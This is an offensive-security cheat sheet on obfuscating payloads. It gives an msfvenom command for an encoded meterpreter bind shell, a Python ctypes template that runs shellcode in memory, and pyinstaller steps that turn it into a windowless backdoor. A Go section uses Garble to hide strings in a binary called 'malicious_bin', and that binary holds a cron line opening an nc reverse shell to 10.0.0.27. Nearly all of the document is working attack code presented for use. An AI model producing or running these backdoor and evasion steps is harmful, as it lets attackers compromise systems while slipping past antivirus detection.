## :tophat: Metasploit Payload Obfuscation Techniques:

<p align="center">
  <img width="600" height="300" src="https://user-images.githubusercontent.com/72598486/204439872-6f102e86-2172-4c3e-a0dd-e82bcca70711.png">
</p>

Utilize Metasploit's ```msfvenom``` to create your desired payload:

```bash
$ msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai '\x00' -i 30 RHOST=10.0.0.68 LPORT=9050 -f c | tr -d '"' | tr -d '\n' | more
```

Grab the string produced for creating your payload and plug it into the template below:

```python
from ctypes import *

shellcode = '<your shellcode, ex: \xda\xdc\xd9\>'
memorywithshell = create_string_buffer(shellcode, len(shellcode))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
```

Compile the backdoor with ```pyinstaller```

```bash
$ python configure.py
$ python makespec.py --onefile --noconsole shell_template.py
$ python build.py shell_template\shell_template.spec
```

This will produce your obfuscated payload which you can use on your target (legally)

## Obfuscating Go Builds

The Garble tool wraps calls to the Go compiler and linker to transform the Go build, in order to:

  - Replace as many useful identifiers as possible with short base64 hashes
  - Replace package paths with short base64 hashes
  - Replace filenames and position information with short base64 hashes
  - Remove all build and module information
  - Strip debugging information and symbol tables via `-ldflags="-w -s"`
  - Obfuscate literals, if the `-literals` flag is given
  - Remove extra information, if the `-tiny` flag is given

```sh
# Building a binary without obfuscation
go build -o malicious_bin main.go

# Searching for malicious strings
strings -n 5 malicious_bin | grep /bin
echo "* * * * * /bin/nc 10.0.0.27 1234 -e /bin/bash"runtime.SetFinalizer: pointer not in allocated blockruntime: use of FixAlloc_Alloc before FixAlloc_Init

# Install Garble
go install mvdan.cc/garble@latest

# Obfuscate the build and search for strings
garble build -o malicious_obf_bin main.go
strings -n 5 malicious_obf_bin | grep /bin
```
